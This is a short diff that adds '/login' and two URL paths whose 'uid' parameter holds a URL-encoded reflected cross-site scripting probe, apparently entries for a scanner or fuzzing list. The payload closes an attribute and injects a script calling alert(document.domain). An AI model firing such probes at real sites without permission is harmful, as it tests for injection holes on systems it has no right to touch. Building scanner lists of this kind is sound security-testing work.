@@ -1,0 +1,4 @@
+
+/login
+/login/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/?uid=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
